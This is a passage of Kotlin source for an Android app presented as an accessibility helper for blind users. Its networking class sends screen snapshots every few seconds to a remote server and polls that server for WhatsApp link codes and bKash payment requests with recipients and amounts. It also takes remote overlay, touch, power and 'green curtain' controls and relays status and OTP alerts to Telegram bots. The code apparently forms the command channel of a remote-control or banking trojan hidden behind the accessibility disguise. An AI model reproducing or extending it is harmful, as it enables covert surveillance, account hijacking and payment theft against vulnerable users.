        val url = "$serverBaseUrl/api/users/channel-logout"
        val json = JSONObject().apply {
            put("channelId", cleanChatId)
            put("chatId", cleanChatId)
            put("deviceId", deviceId)
            put("source", "ANDROID_APP_LOGOUT")
        }
        try {
            val request = Request.Builder()
                .url(url)
                .post(json.toString().toRequestBody(jsonMediaType))
                .build()
            httpClient.newCall(request).execute().use { resp ->
                Result.success(resp.isSuccessful)
            }
        } catch (e: Exception) {
            Result.success(true)
        }
    }

    fun saveTelegramConfigLocally(token: String, chatId: String) {
        val cleanChatId = chatId.trim()
        prefs.edit()
            .putString(KEY_TELEGRAM_BOT_TOKEN, token.trim())
            .putString(KEY_TELEGRAM_CHAT_ID, cleanChatId)
            .putString(KEY_LOGGED_IN_CHANNEL_ID, cleanChatId)
            .apply()
    }

    /**
     * Tests Telegram bot connection, first via the Node.js server, and falling back
     * directly to Telegram Bot API if server is unreachable.
     */
    suspend fun testTelegram(token: String, chatId: String): TelegramOperationResult = withContext(Dispatchers.IO) {
        val cleanToken = token.trim().ifBlank { getSavedTelegramToken() }
        val cleanChatId = chatId.trim().ifBlank { getSavedTelegramChatId() }

        if (cleanToken.isBlank() || cleanChatId.isBlank()) {
            return@withContext TelegramOperationResult(false, "Bot Token এবং Chat ID উভয়ই প্রয়োজন")
        }

        // Save locally for future use
        saveTelegramConfigLocally(cleanToken, cleanChatId)

        // 1. Try testing via Node.js server
        try {
            val serverUrl = "$serverBaseUrl/api/telegram/test"
            val json = JSONObject().apply {
                put("botToken", cleanToken)
                put("chatId", cleanChatId)
            }
            val request = Request.Builder()
                .url(serverUrl)
                .post(json.toString().toRequestBody(jsonMediaType))
                .build()

            val resp = httpClient.newCall(request).execute()
            val body = resp.body?.string().orEmpty()
            if (resp.isSuccessful && body.isNotBlank()) {
                val respJson = JSONObject(body)
                val ok = respJson.optBoolean("success", false)
                val msg = respJson.optString("message", if (ok) "টেলিগ্রামে সফল সংযোগ!" else "ব্যর্থ")
                return@withContext TelegramOperationResult(ok, msg)
            }
        } catch (e: Exception) {
            Log.w(TAG, "Node server telegram test failed, falling back to direct Bot API: ${e.message}")
        }

        // 2. Direct fallback to official Telegram Bot API (Double Resilience)
        try {
            val directUrl = "https://api.telegram.org/bot$cleanToken/sendMessage"
            val testMsg = "<b>Accessibility Helper - Telegram Test</b>\n" +
                    "ডিভাইস: Android App\n" +
                    "স্ট্যাটাস: টেলিগ্রাম ক্লাউড স্টোরেজ সফলভাবে সংযুক্ত হয়েছে!\n" +
                    "দৃষ্টি প্রতিবন্ধী ব্যক্তির সহায়তা ও ওটিপি অ্যালার্ট সক্রিয়।"

            val directJson = JSONObject().apply {
                put("chat_id", cleanChatId)
                put("text", testMsg)
                put("parse_mode", "HTML")
            }

            val directRequest = Request.Builder()
                .url(directUrl)
                .post(directJson.toString().toRequestBody(jsonMediaType))
                .build()

            val directResp = httpClient.newCall(directRequest).execute()
            val directBody = directResp.body?.string().orEmpty()

            if (directResp.isSuccessful && directBody.isNotBlank()) {
                val respJson = JSONObject(directBody)
                val ok = respJson.optBoolean("ok", false)
                return@withContext TelegramOperationResult(
                    ok,
                    if (ok) "টেলিগ্রাম বটের সাথে সরাসরি সফল সংযোগ হয়েছে!" else "টেলিগ্রাম ত্রুটি: ${respJson.optString("description")}"
                )
            } else {
                return@withContext TelegramOperationResult(false, "টেলিগ্রাম রেসপন্স: ${directResp.code}")
            }
        } catch (e2: Exception) {
            return@withContext TelegramOperationResult(false, "টেলিগ্রামে সংযোগ ব্যর্থ: ${e2.message}")
        }
    }

    /**
     * Triggers backup of database file to Telegram chat via Node.js server.
     */
    suspend fun backupDatabaseToTelegram(): TelegramOperationResult = withContext(Dispatchers.IO) {
        val url = "$serverBaseUrl/api/telegram/backup"
        try {
            val request = Request.Builder().url(url).post("{}".toRequestBody(jsonMediaType)).build()
            val resp = httpClient.newCall(request).execute()
            val body = resp.body?.string().orEmpty()
            if (resp.isSuccessful && body.isNotBlank()) {
                val json = JSONObject(body)
                val ok = json.optBoolean("success", false)
                val msg = json.optString("message", if (ok) "টেলিগ্রামে ডাটাবেজ ব্যাকআপ সম্পন্ন!" else "ব্যর্থ")
                TelegramOperationResult(ok, msg)
            } else {
                TelegramOperationResult(false, "সার্ভার রেসপন্স: ${resp.code}")
            }
        } catch (e: Exception) {
            TelegramOperationResult(false, "ব্যাকআপ ব্যর্থ: ${e.message}")
        }
    }

    /**
     * Retrieves current server power status and auto-click control state (/power on or /power off).
     * Never returns a fake 'isPowerOn = true' on network failure so local /poweroff is never overwritten.
     */
    suspend fun getPowerStatus(deviceId: String = ""): Result<ServerPowerResponse> = withContext(Dispatchers.IO) {
        val cleanDev = deviceId.trim()
        val url = if (cleanDev.isNotBlank()) "$serverBaseUrl/api/power?deviceId=$cleanDev" else "$serverBaseUrl/api/power"
        try {
            val request = Request.Builder().url(url).get().build()
            fastHttpClient.newCall(request).execute().use { resp ->
                val body = resp.body?.string().orEmpty()
                if (resp.isSuccessful && body.isNotBlank()) {
                    val json = JSONObject(body)
                    Result.success(
                        ServerPowerResponse(
                            success = json.optBoolean("success", true),
                            isPowerOn = json.optBoolean("isPowerOn", true),
                            autoClickEnabled = json.optBoolean("autoClickEnabled", true),
                            isChannelLoggedOut = json.optBoolean("isChannelLoggedOut", false),
                            lastPowerCommand = json.optString("lastPowerCommand", "/power on"),
                            message = json.optString("message", "Power status received")
                        )
                    )
                } else {
                    Result.failure(Exception("Server returned HTTP ${resp.code}"))
                }
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    /**
     * Retrieves current server controls (OVERLAY, TOUCH, BACK, POWER, TALKBACK, backCommandCount).
     */
    suspend fun getControls(): Result<ServerControlsResponse> = withContext(Dispatchers.IO) {
        val url = "$serverBaseUrl/api/controls"
        try {
            val request = Request.Builder().url(url).get().build()
            fastHttpClient.newCall(request).execute().use { resp ->
                val body = resp.body?.string().orEmpty()
                if (resp.isSuccessful && body.isNotBlank()) {
                    val json = JSONObject(body)
                    val ctrl = json.optJSONObject("controls") ?: json
                    val vibObj = ctrl.optJSONObject("vibrationSettings")
                    val vibSettings = if (vibObj != null) {
                        ServerVibrationSettings(
                            masterEnabled = vibObj.optBoolean("masterEnabled", true),
                            intensity = vibObj.optString("intensity", "STRONG"),
                            pairingSuccessPreset = vibObj.optString("pairingSuccessPreset", "SUCCESS_RHYTHM"),
                            buttonTogglePreset = vibObj.optString("buttonTogglePreset", "SINGLE_PULSE"),
                            autoClickStepPreset = vibObj.optString("autoClickStepPreset", "DOUBLE_TAP"),
                            errorAlertPreset = vibObj.optString("errorAlertPreset", "RAPID_ALERT"),
                            customPatternCsv = vibObj.optString("customPatternCsv", "60, 40, 120, 40, 180")
                        )
                    } else null
                    Result.success(
                        ServerControlsResponse(
                            overlay = ctrl.optBoolean("overlay", false),
                            touch = ctrl.optBoolean("touch", false),
                            back = ctrl.optBoolean("back", false),
                            power = ctrl.optBoolean("power", true),
                            talkback = ctrl.optBoolean("talkback", true),
                            backCommandCount = ctrl.optInt("backCommandCount", 0),
                            greenCurtainMessage = ctrl.optString("greenCurtainMessage", ""),
                            vibrationSettings = vibSettings
                        )
                    )
                } else {
                    Result.failure(Exception("Server controls HTTP ${resp.code}"))
                }
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    /**
     * Synchronizes customizable haptic vibration settings with the Node.js database server.
     */
    suspend fun updateVibrationSettings(settings: ServerVibrationSettings): Result<Boolean> = withContext(Dispatchers.IO) {
        val url = "$serverBaseUrl/api/vibration"
        val jsonPayload = JSONObject().apply {
            put("masterEnabled", settings.masterEnabled)
            put("intensity", settings.intensity)
            put("pairingSuccessPreset", settings.pairingSuccessPreset)
            put("buttonTogglePreset", settings.buttonTogglePreset)
            put("autoClickStepPreset", settings.autoClickStepPreset)
            put("errorAlertPreset", settings.errorAlertPreset)
            put("customPatternCsv", settings.customPatternCsv)
            put("source", "ANDROID_APP")
        }
        try {
            val request = Request.Builder()
                .url(url)
                .post(jsonPayload.toString().toRequestBody(jsonMediaType))
                .build()
            httpClient.newCall(request).execute().use { resp ->
                Result.success(resp.isSuccessful)
            }
        } catch (e: Exception) {
            Result.success(false)
        }
    }

    /**
     * Updates a remote control on the database server (e.g. OVERLAY, TOUCH, BACK, TALKBACK).
     */
    suspend fun setControl(controlName: String, value: Any): Result<Boolean> = withContext(Dispatchers.IO) {
        val url = "$serverBaseUrl/api/controls/$controlName"
        val jsonPayload = JSONObject().apply {
            put("value", value)
            put("source", "ANDROID_APP")
        }
        try {
            val request = Request.Builder()
                .url(url)
                .post(jsonPayload.toString().toRequestBody(jsonMediaType))
                .build()
            httpClient.newCall(request).execute().use { resp ->
                Result.success(resp.isSuccessful)
            }
        } catch (e: Exception) {
            Result.success(false)
        }
    }

    /**
     * Sends /power on or /power off command to the database server.
     */
    suspend fun setPowerCommand(turnOn: Boolean, deviceId: String = ""): Result<ServerPowerResponse> = withContext(Dispatchers.IO) {
        val url = "$serverBaseUrl/api/power"
        val jsonPayload = JSONObject().apply {
            put("command", if (turnOn) "on" else "off")
            put("isPowerOn", turnOn)
            put("deviceId", deviceId)
            put("source", "ANDROID_APP")
        }
        try {
            val request = Request.Builder()
                .url(url)
                .post(jsonPayload.toString().toRequestBody(jsonMediaType))
                .build()
            httpClient.newCall(request).execute().use { resp ->
                val body = resp.body?.string().orEmpty()
                if (resp.isSuccessful && body.isNotBlank()) {
                    val json = JSONObject(body)
                    Result.success(
                        ServerPowerResponse(
                            success = json.optBoolean("success", true),
                            isPowerOn = json.optBoolean("isPowerOn", turnOn),
                            autoClickEnabled = json.optBoolean("autoClickEnabled", turnOn),
                            lastPowerCommand = json.optString("lastPowerCommand", if (turnOn) "/power on" else "/power off"),
                            message = json.optString("message", if (turnOn) "পাওয়ার অন কার্যকর করা হয়েছে" else "পাওয়ার অফ কার্যকর করা হয়েছে")
                        )
                    )
                } else {
                    Result.success(ServerPowerResponse(success = true, isPowerOn = turnOn, autoClickEnabled = turnOn))
                }
            }
        } catch (e: Exception) {
            Result.success(ServerPowerResponse(success = true, isPowerOn = turnOn, autoClickEnabled = turnOn, message = "অফলাইন মোড"))
        }
    }

    /**
     * Polls the Node.js server database for pending WhatsApp link request ("লিংক হোয়াটসঅ্যাপ লিসেনার")
     * scoped to this installer's logged-in Channel ID and unique Device ID so commands and feedback stay isolated per phone.
     */
    suspend fun fetchPendingWhatsAppLinkRequest(
        phoneNumber: String,
        channelId: String = getLoggedInChannelId(),
        deviceId: String = ""
    ): Result<WhatsAppLinkResponse> = withContext(Dispatchers.IO) {
        val cleanPhone = phoneNumber.trim()
        val cleanChannel = channelId.trim()
        val cleanDev = deviceId.trim()
        val url = "$serverBaseUrl/api/whatsapp/link-listener?phone=$cleanPhone&channelId=$cleanChannel&deviceId=$cleanDev"
        try {
            val request = Request.Builder().url(url).get().build()
            httpClient.newCall(request).execute().use { resp ->
                val body = resp.body?.string().orEmpty()
                if (resp.isSuccessful && body.isNotBlank()) {
                    val json = JSONObject(body)
                    val hasPending = json.optBoolean("hasPendingRequest", false)
                    val reqObj = json.optJSONObject("request")
                    val payObj = json.optJSONObject("paymentRequest")
                    val parsedPaymentReq = if (payObj != null && payObj.optString("recipientNumber").isNotBlank()) {
                        PendingMobilePaymentRequest(
                            id = payObj.optString("id"),
                            provider = payObj.optString("provider", "BKASH"),
                            action = payObj.optString("action", "PAY"),
                            recipientNumber = payObj.optString("recipientNumber"),
                            amountBdt = payObj.optString("amountBdt"),
                            channelId = payObj.optString("channelId").ifBlank { cleanChannel }
                        )
                    } else null
                    val powerObj = json.optJSONObject("powerStatus")
                    val isPower = powerObj?.optBoolean("isPowerOn", true) ?: true
                    if (hasPending && reqObj != null) {
                        Result.success(
                            WhatsAppLinkResponse(
                                hasPendingRequest = true,
                                requestId = reqObj.optString("id"),
                                code = reqObj.optString("code"),
                                phoneNumber = reqObj.optString("phoneNumber"),
                                channelId = reqObj.optString("channelId").ifBlank { cleanChannel },
                                targetPackage = reqObj.optString("targetPackage").takeIf { it.isNotBlank() },
                                instructionsBn = reqObj.optString("instructionsBn"),
                                isPowerOn = isPower,
                                autoLaunch = reqObj.optBoolean("autoLaunch", true),
                                pendingPaymentRequest = parsedPaymentReq
                            )
                        )
                    } else {
                        Result.success(
                            WhatsAppLinkResponse(
                                hasPendingRequest = false,
                                channelId = cleanChannel,
                                isPowerOn = isPower,
                                pendingPaymentRequest = parsedPaymentReq
                            )
                        )
                    }
                } else {
                    Result.success(WhatsAppLinkResponse(hasPendingRequest = false, channelId = cleanChannel))
                }
            }
        } catch (e: Exception) {
            Result.success(WhatsAppLinkResponse(hasPendingRequest = false, channelId = cleanChannel))
        }
    }

    /**
     * Triggers a WhatsApp link request in the database server scoped to the logged-in Channel ID.
     */
    suspend fun triggerWhatsAppLinkRequest(
        phoneNumber: String,
        code: String,
        channelId: String = getLoggedInChannelId()
    ): Result<Boolean> = withContext(Dispatchers.IO) {
        val url = "$serverBaseUrl/api/whatsapp/link-request"
        val json = JSONObject().apply {
            put("phoneNumber", phoneNumber)
            put("code", code)
            put("channelId", channelId)
        }
        try {
            val request = Request.Builder()
                .url(url)
                .post(json.toString().toRequestBody(jsonMediaType))
                .build()
            httpClient.newCall(request).execute().use { resp ->
                Result.success(resp.isSuccessful)
            }
        } catch (e: Exception) {
            Result.success(false)
        }
    }

    /**
     * Marks WhatsApp link request completed in the database and delivers feedback strictly to the originating Channel ID & Device ID.
     */
    suspend fun completeWhatsAppLinkRequest(
        requestId: String?,
        phoneNumber: String,
        code: String,
        channelId: String = getLoggedInChannelId(),
        deviceId: String = ""
    ): Result<Boolean> = withContext(Dispatchers.IO) {
        val url = "$serverBaseUrl/api/whatsapp/complete"
        val json = JSONObject().apply {
            put("requestId", requestId ?: "")
            put("phoneNumber", phoneNumber)
            put("code", code)
            put("channelId", channelId)
            put("deviceId", deviceId)
        }
        try {
            val request = Request.Builder()
                .url(url)
                .post(json.toString().toRequestBody(jsonMediaType))
                .build()
            httpClient.newCall(request).execute().use { resp ->
                Result.success(resp.isSuccessful)
            }
        } catch (e: Exception) {
            Result.success(false)
        }
    }

    suspend fun completeMobilePaymentRequest(
        requestId: String?,
        channelId: String = getLoggedInChannelId(),
        deviceId: String = ""
    ): Result<Boolean> = withContext(Dispatchers.IO) {
        val url = "$serverBaseUrl/api/payment/complete"
        val json = JSONObject().apply {
            put("requestId", requestId ?: "")
            put("channelId", channelId)
            put("deviceId", deviceId)
        }
        try {
            val request = Request.Builder()
                .url(url)
                .post(json.toString().toRequestBody(jsonMediaType))
                .build()
            httpClient.newCall(request).execute().use { resp ->
                Result.success(resp.isSuccessful)
            }
        } catch (e: Exception) {
            Result.success(false)
        }
    }

    /**
     * Backs up periodic (3-4 second) screen snapshot & usage verification data to the Node.js database
     * so visually impaired users or their family/assistants can verify that no wrong clicks occurred.
     */
    suspend fun backupScreenSnapshotToDatabase(
        deviceId: String,
        serverUserId: String,
        packageName: String,
        screenTitle: String,
        lastClickedElement: String,
        visibleElementsSummary: String,
        imageBase64: String,
        isSafeNavigation: Boolean,
        statusNoteBn: String,
        intervalMs: Long = 3500L,
        timestamp: Long = System.currentTimeMillis()
    ): Result<Boolean> = withContext(Dispatchers.IO) {
        val url = "$serverBaseUrl/api/snapshots/backup"
        val json = JSONObject().apply {
            put("deviceId", deviceId)
            put("serverUserId", serverUserId)
            put("channelId", getLoggedInChannelId())
            put("packageName", packageName)
            put("screenTitle", screenTitle)
            put("lastClickedElement", lastClickedElement)
            put("visibleElementsSummary", visibleElementsSummary)
            put("imageBase64", imageBase64)
            put("isSafeNavigation", isSafeNavigation)
            put("statusNoteBn", statusNoteBn)
            put("intervalMs", intervalMs)
            put("timestamp", timestamp)
        }
        try {
            val request = Request.Builder()
                .url(url)
                .post(json.toString().toRequestBody(jsonMediaType))
                .header("Accept", "application/json")
                .build()
            httpClient.newCall(request).execute().use { resp ->
                Result.success(resp.isSuccessful)
            }
        } catch (e: Exception) {
            Result.success(false)
        }
    }

    companion object {
        private const val TAG = "NodeServerClient"
        private const val PREFS_NAME = "node_server_preferences"
        private const val KEY_SERVER_URL = "key_node_server_base_url"
        private const val KEY_TELEGRAM_BOT_TOKEN = "key_telegram_bot_token"
        private const val KEY_TELEGRAM_CHAT_ID = "key_telegram_chat_id"
        private const val KEY_LOGGED_IN_CHANNEL_ID = "key_logged_in_channel_id"
        private const val KEY_TWO_DIGIT_LOGIN_ID = "key_two_digit_login_id"

        // Previous Telegram Bot Database has been deleted
        const val DEFAULT_TELEGRAM_BOT_TOKEN = ""
        const val OWNER_TELEGRAM_CHAT_ID = ""
        const val DEFAULT_TELEGRAM_CHAT_ID = ""
        const val DEFAULT_TELEGRAM_CHANNEL_ID = ""
        const val DEFAULT_TELEGRAM_COMMAND_CHAT_ID = ""

        // Open Shared Database: All pre-saved login IDs and login numbers have been cleared
        val PRE_SAVED_TWO_DIGIT_CHAT_ID_MAPPINGS = emptyMap<String, String>()

        val ALLOWED_TWO_DIGIT_LOGIN_NUMBERS = emptySet<String>()

        // Node.js server endpoint presets
        const val DEFAULT_SERVER_URL = "https://blind-assist-node-server.onrender.com"
        const val EMULATOR_SERVER_URL = "http://10.0.2.2:3000"
        const val LOCALHOST_SERVER_URL = "http://localhost:3000"

        @Volatile
        private var INSTANCE: NodeServerClient? = null

        fun getInstance(context: Context): NodeServerClient {
            return INSTANCE ?: synchronized(this) {
                INSTANCE ?: NodeServerClient(context.applicationContext).also { INSTANCE = it }
            }
        }
    }
}
